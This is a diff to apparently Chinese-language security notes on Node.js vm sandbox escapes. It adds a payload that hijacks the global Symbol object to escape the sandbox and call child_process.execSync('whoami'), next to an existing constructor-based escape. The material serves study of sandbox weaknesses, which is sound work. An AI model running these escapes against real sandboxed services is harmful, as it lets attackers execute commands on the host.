@@ -180,6 +180,24 @@ let res = import('./foo.js')
 res.toString.constructor("return this")().process.mainModule.require("child_process").execSync("whoami").toString();
 ```
 
+### 劫持Symbol全局对象
+```js
+Symbol = {
+  get toStringTag(){
+    throw f=>f.constructor("return process")()
+  }
+};
+try{
+  Buffer.from(new Map());
+}catch(f){
+  Symbol = {};
+  f(()=>{}).mainModule.require("child_process").execSync("whoami").toString();
+}
+```
+
+vm
+
+![](attachments/d2976669ebe6f4cef93742b97c6ba3c.png)
 ## 参考文章
 https://xz.aliyun.com/t/11859
 
